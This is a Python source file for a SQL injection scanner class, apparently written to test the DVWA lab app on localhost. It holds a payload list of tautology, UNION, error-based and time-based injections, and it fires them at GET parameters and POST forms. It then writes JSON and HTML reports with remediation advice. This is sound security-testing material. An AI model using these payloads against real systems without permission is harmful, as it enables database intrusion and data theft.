import requests
import time
import json
import os
from colorama import init, Fore

init(autoreset=True)

class SQLInjectionTester:
    def __init__(self, session, base_url="http://localhost:8088"):
        self.session = session
        self.base_url = base_url
        self.vulnerabilities = []
        self.payloads = self._load_payloads()
    
    def _load_payloads(self):
        """Load SQL injection payloads"""
        return [
            # Basic SQLi
            "'",
            "''",
            "`",
            "\"",
            "\"\"",
            
            # Classic SQLi
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1 --",
            "' OR 1=1 #",
            
            # Union based
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL, NULL --",
            "' UNION SELECT 1,2,3 --",
            
            # Error based
            "' AND 1=CONVERT(int, @@version) --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            
            # Time based
            "' OR SLEEP(5) --",
            "' OR BENCHMARK(1000000, MD5('test')) --",
            
            # DVWA specific
            "1' OR '1'='1",
            "admin' --",
            "admin' #",
            
            # Additional
            "' ORDER BY 1 --",
            "' ORDER BY 10 --"
        ]
    
    def test_get_parameters(self, url):
        """Test URL GET parameters for SQLi"""
        from urllib.parse import urlparse, parse_qs, urlencode
        
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                return []
            
            vulns_found = []
            
            for param in params:
                original_value = params[param][0]
                
                print(f"{Fore.CYAN}[*] Testing GET parameter: {param} = {original_value}")
                
                for payload in self.payloads[:10]:  # Test first 10 payloads
                    # Create new params with payload
                    test_params = params.copy()
                    test_params[param] = [payload]
                    
                    # Reconstruct URL
                    new_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    
                    try:
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=10)
                        response_time = time.time() - start_time
                        
                        # Check for SQL errors
                        if self._detect_sql_error(response.text):
                            vuln_info = {
                                'type': 'SQL Injection',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'method': 'GET',
                                'evidence': 'SQL error in response',
                                'severity': 'High',
                                'response_time': f'{response_time:.2f}s'
                            }
                            vulns_found.append(vuln_info)
                            print(f"{Fore.RED}[!] SQLi found in {param}: {payload}")
                            break
                        
                        # Check for time delay
                        if response_time > 4:
                            vuln_info = {
                                'type': 'SQL Injection (Time-based)',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'method': 'GET',
                                'evidence': f'Time delay: {response_time:.2f} seconds',
                                'severity': 'Medium',
                                'response_time': f'{response_time:.2f}s'
                            }
                            vulns_found.append(vuln_info)
                            print(f"{Fore.YELLOW}[!] Time-based SQLi in {param}")
                            break
                        
                        time.sleep(0.5)
                        
                    except Exception as e:
                        print(f"{Fore.RED}[-] Error testing {param}: {e}")
            
            return vulns_found
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error parsing URL {url}: {e}")
            return []
    
    def test_post_forms(self, forms_data):
        """Test POST forms for SQLi"""
        vulns_found = []
        
        for form in forms_data:
            page_url = form['page_url']
            action = form['action']
            method = form['method']
            inputs = form['inputs']
            
            if method != 'POST':
                continue
            
            print(f"{Fore.CYAN}[*] Testing POST form on: {page_url}")
            
            for input_field in inputs:
                if not input_field['name']:
                    continue
                
                field_name = input_field['name']
                field_type = input_field.get('type', 'text')
                
                # Only test text-like fields
                if field_type not in ['text', 'password', 'search', 'email']:
                    continue
                
                print(f"{Fore.WHITE}[*] Testing field: {field_name}")
                
                for payload in self.payloads[:8]:  # Test first 8 payloads
                    # Prepare form data
                    form_data = {}
                    for inp in inputs:
                        if inp['name']:
                            if inp['name'] == field_name:
                                form_data[inp['name']] = payload
                            else:
                                form_data[inp['name']] = inp.get('value', '')
                    
                    try:
                        start_time = time.time()
                        response = self.session.post(action, data=form_data, timeout=10)
                        response_time = time.time() - start_time
                        
                        # Check for SQL errors
                        if self._detect_sql_error(response.text):
                            vuln_info = {
                                'type': 'SQL Injection',
                                'url': action,
                                'parameter': field_name,
                                'payload': payload,
                                'method': 'POST',
                                'evidence': 'SQL error in response',
                                'severity': 'High',
                                'form_page': page_url,
                                'response_time': f'{response_time:.2f}s'
                            }
                            vulns_found.append(vuln_info)
                            print(f"{Fore.RED}[!] SQLi found in POST field {field_name}")
                            break
                        
                        time.sleep(0.5)
                        
                    except Exception as e:
                        print(f"{Fore.RED}[-] Error testing {field_name}: {e}")
        
        return vulns_found
    
    def test_dvwa_sqli(self):
        """Specifically test DVWA SQL Injection page"""
        print(f"{Fore.YELLOW}[*] Testing DVWA SQL Injection page...")
        
        sqli_url = self.base_url + "/vulnerabilities/sqli/"
        vulns_found = []
        
        # Test GET parameter
        test_url = sqli_url + "?id=1&Submit=Submit"
        url_vulns = self.test_get_parameters(test_url)
        vulns_found.extend(url_vulns)
        
        # Test POST request
        for payload in self.payloads[:5]:
            try:
                response = self.session.post(sqli_url, data={
                    'id': payload,
                    'Submit': 'Submit'
                }, timeout=10)
                
                if self._detect_sql_error(response.text):
                    vuln_info = {
                        'type': 'SQL Injection',
                        'url': sqli_url,
                        'parameter': 'id (POST)',
                        'payload': payload,
                        'method': 'POST',
                        'evidence': 'SQL error in DVWA response',
                        'severity': 'High',
                        'response_time': 'N/A'
                    }
                    vulns_found.append(vuln_info)
                    print(f"{Fore.RED}[!] SQLi found in DVWA POST: {payload}")
                    break
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"{Fore.RED}[-] Error testing DVWA POST: {e}")
        
        return vulns_found
    
    def _detect_sql_error(self, response_text):
        """Detect SQL error patterns"""
        sql_errors = [
            'SQL syntax', 'mysql_fetch', 'mysql_', 'ORA-', 'PostgreSQL',
            'SQLite', 'SQL Server', 'ODBC', 'unclosed', 'division by zero',
            'warning: mysql', 'mysql error', 'syntax error', 'unexpected',
            'you have an error', 'supplied argument'
        ]
        
        response_lower = response_text.lower()
        for error in sql_errors:
            if error.lower() in response_lower:
                return True
        return False
    
    def save_results(self):
        """Save SQLi test results"""
        os.makedirs("output", exist_ok=True)
        
        results = {
            'scan_type': 'SQL Injection Test',
            'target': self.base_url,
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities,
            'payloads_tested': len(self.payloads),
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Save JSON
        with open('output/sqli_results.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2)
        
        # Generate HTML report
        self._generate_html_report(results)
        
        print(f"{Fore.GREEN}[+] SQLi results saved to output/sqli_results.json")
        return results
    
    def _generate_html_report(self, results):
        """Generate SQLi HTML report"""
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>WebScanPro - SQL Injection Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        .header {{ background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 20px; }}
        .card {{ background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin-bottom: 20px; }}
        .stat-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
        .stat-box {{ background: #f8f9fa; padding: 15px; border-radius: 8px; text-align: center; }}
        .stat-number {{ font-size: 2em; font-weight: bold; }}
        .high {{ color: #e74c3c; border-left: 4px solid #e74c3c; }}
        .medium {{ color: #f39c12; border-left: 4px solid #f39c12; }}
        .low {{ color: #27ae60; border-left: 4px solid #27ae60; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background: #ee5a52; color: white; }}
        .vuln-row {{ background: #ffeaea; }}
        .safe-row {{ background: #eaffea; }}
        code {{ background: #2c3e50; color: #ecf0f1; padding: 2px 6px; border-radius: 3px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚠️ SQL Injection Test Report</h1>
            <p>Generated: {results['timestamp']} | Target: {results['target']}</p>
        </div>
        
        <div class="stat-grid">
            <div class="stat-box high">
                <div class="stat-number">{results['total_vulnerabilities']}</div>
                <div>Vulnerabilities Found</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{results['payloads_tested']}</div>
                <div>Payloads Tested</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{len([v for v in results['vulnerabilities'] if v['severity'] == 'High'])}</div>
                <div>High Severity</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{len([v for v in results['vulnerabilities'] if v['severity'] == 'Medium'])}</div>
                <div>Medium Severity</div>
            </div>
        </div>'''
        
        if results['vulnerabilities']:
            html += '''
        <div class="card">
            <h2>🔴 Detected Vulnerabilities</h2>
            <table>
                <tr>
                    <th>Type</th>
                    <th>URL</th>
                    <th>Parameter</th>
                    <th>Payload</th>
                    <th>Severity</th>
                    <th>Evidence</th>
                </tr>'''
            
            for vuln in results['vulnerabilities']:
                severity_class = vuln['severity'].lower()
                html += f'''
                <tr class="vuln-row">
                    <td>{vuln['type']}</td>
                    <td>{vuln['url'][:50]}...</td>
                    <td>{vuln['parameter']}</td>
                    <td><code>{vuln['payload']}</code></td>
                    <td class="{severity_class}">{vuln['severity']}</td>
                    <td>{vuln['evidence']}</td>
                </tr>'''
            
            html += '''
            </table>
        </div>'''
        else:
            html += '''
        <div class="card" style="background: #eaffea;">
            <h2 style="color: #27ae60;">✅ No SQL Injection Vulnerabilities Found!</h2>
            <p>The application appears to be secure against SQL Injection attacks.</p>
        </div>'''
        
        html += '''
        <div class="card">
            <h2>🔧 Remediation Recommendations</h2>
            <ol>
                <li><strong>Use Parameterized Queries:</strong> Always use prepared statements with parameterized queries</li>
                <li><strong>Input Validation:</strong> Validate and sanitize all user inputs</li>
                <li><strong>Stored Procedures:</strong> Use stored procedures instead of dynamic SQL</li>
                <li><strong>Error Handling:</strong> Implement proper error handling (don't show SQL errors to users)</li>
                <li><strong>Least Privilege:</strong> Database accounts should have minimum necessary permissions</li>
                <li><strong>WAF:</strong> Consider using a Web Application Firewall</li>
                <li><strong>Regular Testing:</strong> Perform regular security testing and code reviews</li>
            </ol>
        </div>
        
        
    </div>
</body>
</html>'''
        
        with open('output/sqli_report.html', 'w', encoding='utf-8') as f:
            f.write(html)
        
        print(f"{Fore.GREEN}[+] HTML report generated: output/sqli_report.html")